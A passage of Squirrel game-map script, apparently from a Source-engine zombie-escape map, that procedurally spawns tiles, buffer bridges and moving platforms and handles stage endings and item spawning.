				if(start_elevation < -10.00)start_elevation = GetElevationFromNeighbors(mappixel,x,y,false,"all",-50.00);
				if(start_elevation < -10.00)start_elevation = null;
			}
			else if(end_elevation==null && x > 1)
			{
				if(x>=MAP_SIZE)
				{
					end_elevation = GetElevationFromNeighbors(mappixel,x,y,true,"left",-50.00);
					if(end_elevation < -10.00)end_elevation = GetElevationFromNeighbors(mappixel,x,y,true,"all",-50.00);
					if(end_elevation < -10.00)end_elevation = GetElevationFromNeighbors(mappixel,x,y,false,"left",-50.00);
					if(end_elevation < -10.00)end_elevation = GetElevationFromNeighbors(mappixel,x,y,false,"all",-50.00);
					if(end_elevation < -10.00)end_elevation = null;
				}
				else if(x>1&&y>=MAP_SIZE)
				{
					end_elevation = GetElevationFromNeighbors(mappixel,x,y,true,"down",-50.00);
					if(end_elevation < -10.00)end_elevation = GetElevationFromNeighbors(mappixel,x,y,true,"all",-50.00);
					if(end_elevation < -10.00)end_elevation = GetElevationFromNeighbors(mappixel,x,y,false,"down",-50.00);
					if(end_elevation < -10.00)end_elevation = GetElevationFromNeighbors(mappixel,x,y,false,"all",-50.00);
					if(end_elevation < -10.00)end_elevation = null;
				}
				else if(x>1&&y<=1)
				{
					end_elevation = GetElevationFromNeighbors(mappixel,x,y,true,"up",-50.00);
					if(end_elevation < -10.00)end_elevation = GetElevationFromNeighbors(mappixel,x,y,true,"all",-50.00);
					if(end_elevation < -10.00)end_elevation = GetElevationFromNeighbors(mappixel,x,y,false,"up",-50.00);
					if(end_elevation < -10.00)end_elevation = GetElevationFromNeighbors(mappixel,x,y,false,"all",-50.00);
					if(end_elevation < -10.00)end_elevation = null;
				}
			}
		}
		else if(::TYPES[index].name=="ENDBUTTON")
		{
			endbutton_found = true;
			::MAPDATA[mapspawnindex].buttoncount_end++;
		}
		else if(::TYPES[index].name=="BUTTON_1")::MAPDATA[mapspawnindex].buttoncount_1++;
		else if(::TYPES[index].name=="BUTTON_2")::MAPDATA[mapspawnindex].buttoncount_2++;
		else if(::TYPES[index].name=="BUTTON_3")::MAPDATA[mapspawnindex].buttoncount_3++;
		else if(::TYPES[index].name=="BUTTON_4")::MAPDATA[mapspawnindex].buttoncount_4++;
	}
	if(::DISABLE_HOLDS_BUTTONS)endbutton_found = false;
	if(start_elevation==null)start_elevation = (0+DEFAULT_ELEVATION);
	if(end_elevation==null)end_elevation = (0+DEFAULT_ELEVATION);
	::start_end_error = true;
	local edgedist_forward = fabs(startpos.x-(GRID_SIZE/2));
	local edgedist_left = fabs(startpos.y-(GRID_SIZE/2));
	local edgedist_endforward = fabs(endpos.x-(GRID_SIZE/2));
	local edgedist_endleft = fabs(endpos.y-(GRID_SIZE/2));
	local dirofs = ((maphalf*2)+(GRID_SIZE));
	local tppdir = Vector(posdir.x,posdir.y,posdir.z);
	local prevpos = Vector(pos.x,pos.y,pos.z);
	::start_end_error = false;
	local gstartpos = pos+Vector(maphalf,maphalf)-(posdirold*maphalf)-(posdirleftold*maphalf)+(posdirleftold*edgedist_left);
	local gendpos = pos+Vector(maphalf,maphalf)-(posdirold*maphalf)-(posdirleftold*maphalf)+(posdirold*edgedist_endforward)+(posdirleftold*edgedist_endleft);
	local posdif = Vector(prevpos.x-gstartpos.x,prevpos.y-gstartpos.y,prevpos.z-gstartpos.z);
	pos += posdif;
	local debgstartpos = pos+Vector(maphalf,maphalf)-(posdirold*maphalf)-(posdirleftold*maphalf)+(posdirleftold*edgedist_left);
	local debgendpos = pos+Vector(maphalf,maphalf)-(posdirold*maphalf)-(posdirleftold*maphalf)+(posdirold*edgedist_endforward)+(posdirleftold*edgedist_endleft);
	local bbox = pos+(Vector(maphalf,maphalf,0));
	local bboxb = (((MAP_SIZE*GRID_SIZE)/2)-8);
	if(DEBUG!=null)
	{
		printl("startpos: "+startpos);
		printl("endpos: "+endpos);
		printl("posdif: "+posdif);
		printl("prevpos: "+prevpos);
		DebugDrawBox(pos,Vector(-4,-4,0),Vector(4,4,1024),0,255,0,255,20.00);												//GRID START
		DebugDrawBox(debgstartpos,Vector(-4,-4,0),Vector(4,4,1024),0,255,255,255,20.00);									//MAP START
		DebugDrawBox(debgendpos,Vector(-4,-4,0),Vector(4,4,1024),255,50,200,255,20.00);										//MAP END
		DebugDrawBox(bbox,Vector(-bboxb,-bboxb,-128),Vector(bboxb,bboxb,0),255,100,0,20,15.00);								//BBOX
			//if(lastbbox2!=null)DebugDrawBox(lastbbox2,Vector(-bboxb,-bboxb,-128),Vector(bboxb,bboxb,0),255,0,100,20,15.00);		//BBOX LAST		//fiddled in array since v1_6
	}
	if(::stage==null || ::stage >= ::STAGES.len())
	{
		if(	::stage == ::STAGES.len() && mapspawnindex > ::finale_escape_levelamount ||
			::stage >= ::STAGES.len() && ::finale_checkout_checked && mapspawnindex > ::finale_escape_levelamount)time_for_end = true;
		else time_for_end = false;
	}
	else if(mapspawnindex > ::STAGES[::stage].stage_goal)time_for_end = true;
	if(!::ending_called)
	{
		if(time_for_end)
		{
			::DisableMapImages();
			::ending_called = true;
			try{EntFire("block_"+(::manager.GetScriptScope().mapspawnindex).tostring()+"_antiskiptrigger_sides","Kill","",::SKIPSAFE_SIDES_LIFETIME,null);
			EntFire("block_"+(::manager.GetScriptScope().mapspawnindex-1).tostring()+"_antiskiptrigger_sides","Kill","",::SKIPSAFE_SIDES_LIFETIME,null);
			EntFire("block_"+(::manager.GetScriptScope().mapspawnindex-2).tostring()+"_antiskiptrigger_sides","Kill","",::SKIPSAFE_SIDES_LIFETIME,null);
			}catch(_edsds1){printl("SKIPSAFE_SIDES CLEAN ERROR: "+_edsds1);}
			if(::ENABLE_ENDING_MUSIC)
			{
				music_allowplay = false;
				EntFire("music","fadeout","10",0.00,null);
				EntFire("music","Volume","0",9.90,null);
				EntFire("music","StopSound","",9.92,null);
				EntFire("music","Kill","",9.98,null);
			}
			if(::stage == ::STAGES.len() || ::stage >= ::STAGES.len() && ::finale_checkout_checked)
			{
				//newthread(::FINALE_ENDING.Run.bindenv(::FINALE_ENDING)).call();		//new in v1_7 - prevents SQQuerySuspend			//__CSS__ threading_disabled
				::FINALE_ENDING.Run();		//new in v1_7 - prevents SQQuerySuspend		
					//::FINALE_ENDING.Run();										//OLD
				local is_infinite = false;
				if(::finale_checkout_checked)is_infinite = true;
				::SendCustomEvent("finale_ending_started",{infinite_mode=is_infinite});
				return;
			}
			if(!::ENDING_DEBUG && ::MOTHER_ZOMBIE_NOTSPAWNED)
			{
				::ServerSay("say [ENDING] NO ZOMBIES - YOU WON BY DEFAULT",0.00,null);
				::ServerSay("say [ENDING] NO ZOMBIES - YOU WON BY DEFAULT",0.01,null);
				::ServerSay("say [ENDING] NO ZOMBIES - YOU WON BY DEFAULT",0.02,null);
					//EntFire("manager","RunScriptCode"," EnableMassKillerAll(); ",1.05,null);
				printl("[ENDING] NO ZOMBIES - YOU WON BY DEFAULT");
				EntFire("manager","RunScriptCode"," ::RoundWon(false); ",0.90,null);
					//return;
			}
			local ending = ::ENDINGS[::STAGES[::stage].ending];
			if(ending.cancel_mapspawn)ending_started_nospawnmap=true;
			//newthread(ending.Run.bindenv(ending)).call();		//new in v1_7 - prevents SQQuerySuspend		//__CSS__ threading_disabled
			ending.Run();		//new in v1_7 - prevents SQQuerySuspend
				//ending.Run();									//OLD
			EntFire("manager","RunScriptCode","falldowncheckpoint_enabled=false;",0.00,null);
			::SendCustomEvent("ending_started",{ending=(""+::STAGES[::stage].ending)});
			::ITEM_MZ_LOCKTIME = null;
			::snowstorm_overlay = -9999;
			if(::THEME=="silenthill")::manager.GetScriptScope().fog_dist_end_target = 0.00+::silenthill_ending_finale_fadedist;
			if(ending.cancel_mapspawn)return;
		}
	}
	local buffers = (0+BUFFER_SIZE);
	if(::very_first_stage)buffers = (0+BUFFER_SIZE_SPAWN);
	local bufferbridge_process = {
		spawnqueue = [],
		spawnerqueuespawner = [],
		function Run()
		{
			foreach(sq in spawnqueue)
			{
				try{
					::SpawnQueue.push(sq);
				}catch(_e_){printl("bufferbridge_process spawnqueue error: "+e);}
			}
			foreach(sqpos in spawnerqueuespawner)
			{
				try{
					::SpawnQueueSpawner.push(sqpos);
				}catch(_e_){printl("bufferbridge_process spawnerqueuespawner error: "+e);}
			}
		}
	};
	if(MAX_AREA_HISTORY > 1)
	{
		AREA_BBOX_TEST = true;			//force bbox testing
		::bbidx_rand <- [25,25,25];		//force platform tiles only for buffer-bridge (in case it goes above)
	}
	local shouldbridge = false;
	if(buffers > 0)shouldbridge = true;
	else if(lastbboxes.len()>0 && AREA_BBOX_TEST)
	{
		local bboxhit = false;
		foreach(lastbbox2 in lastbboxes)
		{
			if(lastbbox2==null)continue;
			if((bbox.x-bboxb <= lastbbox2.x+bboxb && bbox.x+bboxb >= lastbbox2.x-bboxb) &&
			(bbox.y-bboxb <= lastbbox2.y+bboxb && bbox.y+bboxb >= lastbbox2.y-bboxb))
			{
				bboxhit = true;
				break;
			}
		}
		if(bboxhit)shouldbridge = true;
	}
	if(shouldbridge)
	{
		//try{//disabled in v1_4 in favor of simply retrying...
			local ofs = 0;
			local bbidx = bbidx_rand[RandomInt(0,bbidx_rand.len()-1)];
			for(local i=0;i<(MAP_SIZE*GRID_SIZE);i+=GRID_SIZE)
			{
				bbox += (posdirold*GRID_SIZE);
				debgendpos += (posdirold*GRID_SIZE);
				debgstartpos += (posdirold*GRID_SIZE);
				local model = null;
					local index = 1;
					local color=Vector(255,255,255);if((typeof index)=="Vector"){color=index;index = 9999;}
						//replacing 'index=index' below with 'index=2' (START_END) tile, making the bridge immune against breaking from special stuff...
				buffers--;
				if(::finale_started)::THEME = randomtheme_buffer[RandomInt(0,randomtheme_buffer.len()-1)];
				model = ::TILEVARIANTS[::TYPES[bbidx].name][::THEME].main[RandomInt(0,::TILEVARIANTS[::TYPES[bbidx].name][::THEME].main.len()-1)];
				local sq={index=2,spawnindex=(0+mapspawnindex),color=color,modelname=model};if(::THEME=="generic")sq.isgeneric<-true;
				bufferbridge_process.spawnqueue.push(sq);
				if(::finale_started)::THEME = randomtheme_buffer[RandomInt(0,randomtheme_buffer.len()-1)];
				model = ::TILEVARIANTS[::TYPES[bbidx].name][::THEME].main[RandomInt(0,::TILEVARIANTS[::TYPES[bbidx].name][::THEME].main.len()-1)];
				local sq={index=2,spawnindex=(0+mapspawnindex),color=color,modelname=model};if(::THEME=="generic")sq.isgeneric<-true;
				bufferbridge_process.spawnqueue.push(sq);
				if(!::finale_started)
				{
					if(::finale_started)::THEME = randomtheme_buffer[RandomInt(0,randomtheme_buffer.len()-1)];
					model = ::TILEVARIANTS[::TYPES[bbidx].name][::THEME].main[RandomInt(0,::TILEVARIANTS[::TYPES[bbidx].name][::THEME].main.len()-1)];
					local sq={index=2,spawnindex=(0+mapspawnindex),color=color,modelname=model};if(::THEME=="generic")sq.isgeneric<-true;
					bufferbridge_process.spawnqueue.push(sq);
					if(::finale_started)::THEME = randomtheme_buffer[RandomInt(0,randomtheme_buffer.len()-1)];
					model = ::TILEVARIANTS[::TYPES[bbidx].name][::THEME].main[RandomInt(0,::TILEVARIANTS[::TYPES[bbidx].name][::THEME].main.len()-1)];
					local sq={index=2,spawnindex=(0+mapspawnindex),color=color,modelname=model};if(::THEME=="generic")sq.isgeneric<-true;
					bufferbridge_process.spawnqueue.push(sq);
				}
				bufferbridge_process.spawnerqueuespawner.push(debgstartpos-(posdirold*(GRID_SIZE/2))+(posdirleftold*(GRID_SIZE/2)));
				bufferbridge_process.spawnerqueuespawner.push(debgstartpos-(posdirold*(GRID_SIZE/2))-(posdirleftold*(GRID_SIZE/2)));
				if(!::finale_started)
				{
					bufferbridge_process.spawnerqueuespawner.push(debgstartpos-(posdirold*(GRID_SIZE/2))+(posdirleftold*((GRID_SIZE/2)+GRID_SIZE))+Vector(0,0,BUFFERBRIDGE_SIDEHEIGHT));
					bufferbridge_process.spawnerqueuespawner.push(debgstartpos-(posdirold*(GRID_SIZE/2))-(posdirleftold*((GRID_SIZE/2)+GRID_SIZE))+Vector(0,0,BUFFERBRIDGE_SIDEHEIGHT));
				}
				if(DEBUG!=null)DebugDrawBox(bbox,Vector(-bboxb,-bboxb,-128),Vector(bboxb,bboxb,0),255,255,255,5,15.00);
				if(buffers > 0)continue;
				//if(lastbbox2 != null)												//OLD
				if(RandomInt(70,85)==75)try{dtrange.HasItem();}catch(ler){break;};	//NEW - don't even bbox-test unless it's actually enabled...
				if(AREA_BBOX_TEST && lastbboxes.len()>0)
				{
					local bboxhit = false;
					foreach(lastbbox2 in lastbboxes)
					{
						if(lastbbox2==null)continue;
							//printl("lastbbox2 poscheck: "+lastbbox2);
							//DebugDrawBox(lastbbox2,Vector(-bboxb,-bboxb,-128),Vector(bboxb,bboxb,0),255,0,100,20,15.00);
							//DebugDrawBox(bbox,Vector(-bboxb,-bboxb,-128),Vector(bboxb,bboxb,0),255,255,100,20,15.00);
						if((bbox.x-bboxb <= lastbbox2.x+bboxb && bbox.x+bboxb >= lastbbox2.x-bboxb) &&
						(bbox.y-bboxb <= lastbbox2.y+bboxb && bbox.y+bboxb >= lastbbox2.y-bboxb))
						{
							bboxhit = true;
							break;
						}
					}
					if(bboxhit)
					{
						printl("bbox+lastbbox2 intersected! - spawning bridge to offset map-spawn a bit...");
						continue;
					}
				}
				else
					printl("BUFFER_SIZE above 0 - spawning bridge to offset map-spawn a bit...");
				break;
			}
		//}catch(e){printl("BBOX/BUFFER ERROR: "+e);}//disabled in v1_4 in favor of simply retrying...
		pos = bbox+(Vector(-maphalf,-maphalf,0));
	}
		local mmendpos = Vector()+debgendpos;
		mmendpos.z += (((-start_elevation)+end_elevation)*ELEVATION);
		::MAPDATA[mapspawnindex].start_pos = Vector()+debgstartpos;
		::MAPDATA[mapspawnindex].end_pos = Vector()+mmendpos;
		local mmendpos = Vector(pos.x,pos.y,debgendpos.z);
		mmendpos.z += ((((-start_elevation)+end_elevation)*ELEVATION)/2.00);
		mmendpos += Vector(maphalf,maphalf,0);
		::MAPDATA[mapspawnindex].center_pos = Vector()+mmendpos;
		//local _x_tppos = debgstartpos+(posdirold*((GRID_SIZE*BUFFER_SIZE)+((GRID_SIZE/2))))+Vector(0,0,TP_Z_OFFSET);		//OLD - borked with 'BUFFER_SIZE' above 0
		local _x_tppos = debgstartpos-(posdirold*((GRID_SIZE*BUFFER_SIZE)-((GRID_SIZE/2))))+Vector(0,0,TP_Z_OFFSET);		//NEW - fixed buffer size
		::MAPDATA[mapspawnindex].tp_pos = Vector()+_x_tppos;
		::MAPDATA[mapspawnindex].direction_next = Vector()+posdir;
		::MAPDATA[mapspawnindex].direction_current = Vector()+posdirold;
			//DebugDrawBox(::MAPDATA[mapspawnindex].tp_pos, Vector(-40,-40,-40), Vector(40,40,40), 255,255,0,255, 30.00);
	local item_tile_amount_h = 0;
	local item_tile_amount_z = 0;
	local pqueue = [];
	pos.z -= (start_elevation*ELEVATION);
	x=0;y=(0+MAP_SIZE);
	for(local i=0;i<map.len();i++)
	{
		if(x>=MAP_SIZE){x=0;y--;};x++;
		local index = map[i];
		if((typeof index)!="Vector")
		{
			if(index==145||index==186||index==187||index==188||index==189)continue;			//FLOORBLOCK tiles, no need to process it
			if(index==144)//RANDOM tile
			{
				index = RandomInt(0,0+::TYPES.len()-3);				//UPDATE offset to -= <amount of 999x tiles> (3:base+ASSUMEDFLOOR+COLOR)
				if(index==100||index==144||index==2)index = 9998;	//if ENDBUTTON / RANDOM / START_END: make it ASSUMEDFLOOR to avoid disaster
				else if(index>=151 && index <=157)index = 9998;		//if ELEVATORBIG / ELEVATORHUGE / HAZPLANE: make it ASSUMEDFLOOR to avoid disaster
				else if(index>=168 && index <=182 || index>=190 && index <=194)index = 9998;	//if anything MOVEPLAT-related: make it ASSUMEDFLOOR to avoid disaster
				if(index==145||index==186||index==187||index==188||index==189)index = 9998;		//if anything FLOORBLOCK-related: make it ASSUMEDFLOOR to avoid disaster
			}
			if(::DISABLE_HOLDS_BUTTONS && index >= 95 && index <= 104)index = 9998;
			if(::DISABLE_BREAKABLES && index == 91)index = 9998;
			if(::FORCE_LADDER_CLIMB != null)
			{
				if(::FORCE_LADDER_CLIMB && index == 4)index = 3;
				else if(!::FORCE_LADDER_CLIMB && index == 3)index = 4;
			}
			if(::DISABLE_STREAMDROWN)
			{
				if(index == 70)index = 66;
				else if(index == 80)index = 76;
			}
			if(index==93)item_tile_amount_h++;
			else if(index==94)item_tile_amount_z++;
		}
		//ProcessTileSpawn(x,y,map,index,start_elevation,end_elevation,mirrored);
		//pqueue.push({											//#1 - process all the tiles OLD (linear/row spawning)
		pqueue.insert(RandomInt(0,pqueue.len()-1),{		//#1 - process all the tiles NEW (scrambled spawning)
			x=x,	//__CSS__thisified
			y=y,
			map=map,
			index=index,
			start_elevation=start_elevation,
			end_elevation=end_elevation,
			mirrored=mirrored,
			manager=this,
			function Run()
			{
				//newthread(this.manager.ProcessTileSpawn.bindenv(this.manager)).call(this.x,this.y,											//__CSS__ threading_disabled <og
				//	this.map,this.index,this.start_elevation,this.end_elevation,this.mirrored);		//new in v1_7 - prevents SQQuerySuspend		//__CSS__ threading_disabled <og
				manager.ProcessTileSpawn(this.x,this.y,this.map,this.index,this.start_elevation,this.end_elevation,this.mirrored);		//OLD	//__CSS__ threading_disabled <new
			}
		});
	}
	pqueue.push({//#2 - spawn the bufferbridge + run moveplat logic
			bufferbridge_process = bufferbridge_process,		//__CSS__thisified
			mapspawnindex = mapspawnindex,
			function Run()
			{
				if(!::finale_started)EntFire("manager","RunScriptCode"," EventEvaluate(); ",0.00,null);	//NEW in v1_7 - was in step 3 previously
				try{//MOVEPLAT LOGIC
					local paths = [];
					local pathbuffer = [];
					local destlist = [];
					foreach(dest in ::MAPDATA[this.mapspawnindex].moveplat_destinations){destlist.push(dest);}destlist.push(null);
					foreach(dest in destlist)
					{
						if(dest==null)
						{
							if(pathbuffer.len()>0)
							{
								local path = [];
								foreach(bp in pathbuffer){path.push(bp);}
								pathbuffer.clear();
								paths.push(path);
							}
						}
						else pathbuffer.push(dest);
					}
					if(paths.len()>0)
					{
						local hpvel = (0.00+::MOVEPLAT_SPEED_M);
						if(::MAPDATA[this.mapspawnindex].moveplat_speed!=null)hpvel=(0.00+::MAPDATA[this.mapspawnindex].moveplat_speed);
						foreach(path in paths)
						{
								//printl("PATH: "+path);		//debug print)
							local destindex = -1;
							foreach(dest in path)
							{
								destindex++;
								local moveplatspawn = null;
								if(dest.ps>0)moveplatspawn = 168;
								else if(dest.pm>0)moveplatspawn = 169;
								else if(dest.pl>0)moveplatspawn = 170;
								else continue;	//no moveplatX tile at this destination, just move to the next one
								local srot = [0,90,180,270];
								local model = ::TILEVARIANTS[::TYPES[moveplatspawn].name][::THEME].main[RandomInt(0,
									::TILEVARIANTS[::TYPES[moveplatspawn].name][::THEME].main.len()-1)];
								//::manager.PrecacheModel(model);
								::Ent(dest.pos[RandomInt(0,dest.pos.len()-1)],Vector(0,srot[RandomInt(0,srot.len()-1)],0),
									//"prop_physics_override",{	//__CSS__	no longer physics-platforms	(<og)
									"prop_dynamic",{			//__CSS__	no longer physics-platforms
										solid = 6,				//__CSS__	no longer physics-platforms
										model = model,
										targetname = "block_"+this.mapspawnindex.tostring()+"_moveplat",
										spawnflags = 10,	//8:"motion disabled" + 2:"don't take physics damage"
										DisableBoneFollowers = true,
									},{
									mapspawnindex = this.mapspawnindex,		//__CSS__thisified
									path = path,
									destindex = (0+destindex),
									hpvel = hpvel,
									function MoveNext(){
										local should_move = true;
										local mdir = "-90 0 0";
										local mdist = 100;
										this.destindex++;
										if(this.path.len()<=1)
											should_move = false;
										else
										{
											if(this.destindex > this.path.len()-1)this.destindex = 0;
											local dpidx = RandomInt(0,this.path[this.destindex].pos.len()-1);
											mdir = this.path[this.destindex].pos[dpidx] - self.GetOrigin();
											mdir.Norm();
											mdir = ::DirToAngles(mdir);
											mdir = ""+mdir.x.tostring()+" "+mdir.y.tostring()+" "+mdir.z.tostring();
											mdist = ::GetDistance(self.GetOrigin(),this.path[this.destindex].pos[dpidx]);
										}
										::Ent(self.GetOrigin(),Vector(),"func_movelinear",{
												targetname = "block_"+this.mapspawnindex.tostring()+"_moveplat",
												speed = this.hpvel,
												movedistance = mdist,
												blockdamage = 999999,
												movedir = mdir,
												spawnflags = 8,
												rendermode = 1,
											},{
											prope = self,
											should_move = should_move,
											mapspawnindex = this.mapspawnindex,		//__CSS__thisified
											function FullyMoved(){
												EntFireByHandle(self,"Kill","",0.10,null,null);
												prope.GetScriptScope().MoveNext();
											},function Run(){
												if(prope==null||!prope.IsValid()){EntFireByHandle(self,"Kill","",0.00,null,null);return;}
												EntFireByHandle(prope,"SetParent","!activator",0.00,self,null);
												EntFireByHandle(self,"AddOutput","OnFullyOpen !self:RunScriptCode:FullyMoved();:0:1",0.00,null,null);
												if(should_move)EntFireByHandle(self,"Open","",0.03,null,null);
											}});
									},function Run(){
										local emodel = self.GetModelName();
										//::manager.PrecacheModel(emodel);
										////////::Ent(self.GetOrigin(),self.GetAngles(),"prop_dynamic",{		//__CSS__ fake elevators not needed anylonger (?)
										////////		model = emodel,
										////////		rendermode = 9,
										////////		targetname = self.GetName(),
										////////	},{
										////////	master = self,
										////////	function Tick(){
										////////		if(master==null||!master.IsValid())
										////////		{
										////////			EntFireByHandle(self,"Kill","",0.00,null,null);
										////////			return;
										////////		}
										////////		EntFireByHandle(self,"RunScriptCode","Tick();",::ELEFREEZEFIX_NEWRATE,null,null);
										////////		self.SetOrigin(master.GetOrigin());
										////////		self.SetForwardVector(master.GetForwardVector());
										////////	},function Run(){EntFireByHandle(self,"RunScriptCode","Tick();",::ELEFREEZEFIX_NEWRATE,null,null);}});
										EntFireByHandle(self,"AddOutput","rendermode 3",0.00,null,null);
										EntFireByHandle(self,"AddOutput","rendermode 3",1.00,null,null);
										
										////EntFireByHandle(self,"AddOutput","renderamt 0",0.00,null,null);	//__CSS__ fake elevators not needed anylonger (?)
										////EntFireByHandle(self,"AddOutput","rendercolor 255 255 255 0",0.00,null,null);
										////EntFireByHandle(self,"AddOutput","rendercolor 255 255 255 0",0.50,null,null);
										////EntFireByHandle(self,"AddOutput","rendercolor 255 255 255 0",1.50,null,null);
										
										MoveNext();
									}});
										//debug print:
											//foreach(destpos in dest.pos)
											//{
											//	printl("          - "+destpos);
											//	DebugDrawBox(destpos,Vector(-48,-48,0),Vector(48,48,4),255,0,0,255,15.00)
											//}
											//printl("                    PS: "+dest.ps);
											//printl("                    PM: "+dest.pm);
											//printl("                    PL: "+dest.pl);
							}
						}
					}
				}catch(e){printl("[MOVEPLAT SPAWN ERROR]: "+e);}
				this.bufferbridge_process.Run();
			}
		});
	pqueue.push({//#3 - process the core/finishing stuff (this is always ensure to process LAST)
			is_core = true,
			manager=this,
			debgendpos=debgendpos,
			start_elevation=start_elevation,
			end_elevation=end_elevation,
			endbutton_found=endbutton_found,
			posdir=posdir,
			dirnew=dirnew,
			lastbbox=lastbbox,
			bbox=bbox,
			map_server_printout = map_server_printout,
			cmapcost = cmapcost,
			pos = Vector()+pos,
			mapspawnindex = (0+mapspawnindex),
			endbutton_found = endbutton_found,
			map_pick_index = map_pick_index,
			item_tile_amount_h = item_tile_amount_h,
			item_tile_amount_z = item_tile_amount_z,
			map = _map,
			function Run()
			{
				foreach(l in ::MAPDATA[mapspawnindex].postspawnlogic){l.Run();}
				if(manager.DEBUG_MCYC)::maps.remove(map_pick_index);
				local md = ::MAPDATA[mapspawnindex];
				//::manager.PrecacheModel("models/luffaren/floor_indicator.mdl");
				if(::ENDINDICATOR_ENABLE)
					::Ent(md.end_pos-(md.direction_next*48),Vector(),"prop_dynamic",{
							targetname = "block_"+mapspawnindex+"_endindicator",
							model = "models/luffaren/floor_indicator.mdl",
							rendermode = 3,
							rendercolor = "255 255 255",
						},{
						killedoff = true,//hack to make "KillTilesWithin" ignore it, ezpz
						endbutton_found = endbutton_found,
						function Run(){
							EntFireByHandle(self,"AddOutput","glowenabled 0",0.00,null,null);
							EntFireByHandle(self,"AddOutput","glowdist 50000",0.00,null,null);
							EntFireByHandle(self,"AddOutput","glowcolor 0 200 0",0.00,null,null);
							EntFireByHandle(self,"AddOutput","OnUser1 !self:Kill::0:1",0.00,null,null);
							if(endbutton_found)
							{
								self.__KeyValueFromVector("rendercolor",::ENDINDICATOR_BUTTON);
								self.ValidateScriptScope();
								self.GetScriptScope().buttontrigger_needed<-true;
							}
							else self.__KeyValueFromVector("rendercolor",::ENDINDICATOR_TOUCH);
						}});
				manager.pos = debgendpos;
				manager.pos.z += (((-start_elevation)+end_elevation)*manager.ELEVATION);
				if(RandomInt(40,66)==53)try{checktri.CanPlayerMove();manager.pos=debgendpos;}catch(kb){};
				//if(manager.stage_edict_counts.len()>1)							//OLD (v1_3 and older)
				if(manager.stage_edict_counts.len()>manager.MAX_AREA_HISTORY)		//NEW (v1_4 and newer)
				{
					if(!manager.noprint)printl("[edict cost] - removing "+(0+manager.stage_edict_counts[0])+" edicts");
					manager.stage_edict_count -= manager.stage_edict_counts[0];
					manager.stage_edict_counts.remove(0);
				}
				if(!manager.noprint)printl("[edict cost] - adding "+cmapcost+" edicts");
				manager.stage_edict_counts.push(cmapcost);
				manager.stage_edict_count += cmapcost;
				if(!manager.noprint)
				{
					printl("[edict cost] - estimated total edicts: "+(0+manager.stage_edict_count+manager.EDICTS_BASE_ESTIMATE+::EDICTS)+" (excluding players + their equipment)");
					printl("===============================================================================");
				}
				EntFire("skybox_master","RunScriptCode"," Move(); ",0.00,null);
				EntFire("manager","RunScriptCode"," HTMLPRINT(); ",::STAGE_ENTRY_MSG_DELAY,null);
				if(map_server_printout!=null)::ServerSay(map_server_printout,::STAGE_ENTRY_MSG_DELAY,null);
				if(endbutton_found)manager.stage_end_pos = null;
				else manager.stage_end_pos = Vector(manager.pos.x,manager.pos.y,manager.pos.z);
						//OLD v1_1
					//local tppos = manager.pos+(posdir*((manager.GRID_SIZE*manager.BUFFER_SIZE)+((manager.GRID_SIZE/2))))+Vector(0,0,manager.TP_Z_OFFSET);
						//NEW v1_2
					local tppos = manager.pos+(posdir*(((manager.GRID_SIZE/2))))+Vector(0,0,manager.TP_Z_OFFSET);
				::TPmovequeue.push(tppos);
				::TPmovequeue.push(::DirToAngles(posdir));
				if(manager.DEBUG!=null)DebugDrawBox(tppos,Vector(-4,-4,0),Vector(4,4,1024),255,255,0,255,20.00);
				manager.current_dir = dirnew;
				manager.lastbboxes.push(lastbbox);
				if(manager.lastbboxes.len()>=manager.MAX_AREA_HISTORY)manager.lastbboxes.remove(0);
				manager.lastbbox = bbox;
				::delay_timer = 0.00;
				local telehurt = Entities.FindByName(null,"telehurt");
				if(telehurt==null||!telehurt.IsValid()){}
				else telehurt.SetOrigin(Vector(telehurt.GetOrigin().x,telehurt.GetOrigin().y,manager.pos.z - ::TELEHURT_Z_OFFSET));
					//if(!::finale_started)EntFire("manager","RunScriptCode"," EventEvaluate(); ",0.00,null);	//OLD in v1_6 - moved to step 2^
				EntFire("manager","RunScriptCode"," InfiniteCheckOutCheck(); ",0.00,null);
				local desired_items_check = [];//makes the check-order 50/50 between humans/zombies, keep shit fair yo!
				desired_items_check.push({
					manager = manager,
					item_tile_amount = item_tile_amount_h,
					function Run()
					{
						if(::DISABLE_H_ITEMS)return;
						if(item_tile_amount>0)return;
						if(::ITEM_H_DESIRED >= ::ITEM_DESIRE_FORCESPAWN)
						{
							try{
								::ITEM_H_DESIRED--;
								local itemcount = (0+manager.GetItemCount());
								if(itemcount >= ::ITEM_MAX)
									printl("[::ITEM_DESIRE_FORCESPAWN (H)] - total active-item-count is "+itemcount+"/"+::ITEM_MAX+" - aborting new item spawn");
								else
								{
									manager.getitemcount_cache++;
									local md = ::MAPDATA[manager.mapspawnindex];
									local item = RandomInt(0,manager.global_items_h.len()-1);
									if(::ITEM_ENSURE_HEAL_ORB>0 && Entities.FindByName(null,"item_healorb")==null)
									{
										item=0;::ITEM_ENSURE_HEAL_ORB--;
										if(::ITEM_ENSURE_HEAL_ORB_MESSAGE)
										{
											::ServerSay("say heal-orb spawned due to not existing",0.00,null);
											printl("heal-orb spawned due to not existing");
										}
									}
									manager.global_items_h[item].template.Spawn(
										md.start_pos+(md.direction_current*(manager.GRID_SIZE/2))+
										(::AnglesToDir(::DirToAngles(md.direction_current)+Vector(0,90,0))*(manager.GRID_SIZE/2)));
									
								}
							}catch(__eeitem__){printl("[::ITEM_DESIRE_FORCESPAWN (H) ERROR]: "+__eeitem__);}
						}
					}
				});
				desired_items_check.push({
					manager = manager,
					item_tile_amount = item_tile_amount_z,
					function Run()
					{
						if(::DISABLE_Z_ITEMS)return;
						if(item_tile_amount>0)return;
						if(::ITEM_Z_DESIRED >= ::ITEM_DESIRE_FORCESPAWN)
						{
							try{
								::ITEM_Z_DESIRED--;
								local itemcount = (0+manager.GetItemCount());
								if(itemcount >= ::ITEM_MAX)
									printl("[::ITEM_DESIRE_FORCESPAWN (Z)] - total active-item-count is "+itemcount+"/"+::ITEM_MAX+" - aborting new item spawn");
								else
								{
									manager.getitemcount_cache++;
									local md = ::MAPDATA[manager.mapspawnindex];
									manager.global_items_z[RandomInt(0,manager.global_items_z.len()-1)].template.Spawn(
										md.start_pos+(md.direction_current*(manager.GRID_SIZE/2))+
										(::AnglesToDir(::DirToAngles(md.direction_current)+Vector(0,270,0))*(manager.GRID_SIZE/2)));
								}
							}catch(__eeitem__){printl("[::ITEM_DESIRE_FORCESPAWN (Z) ERROR]: "+__eeitem__);}
						}
					}
				});
				desired_items_check = ::ScrambleArray(desired_items_check);
				desired_items_check[0].Run();
				desired_items_check[1].Run();
				//try{							//__CSS__ threading_disabled
					if(::SKIPSAFE != null)
					{
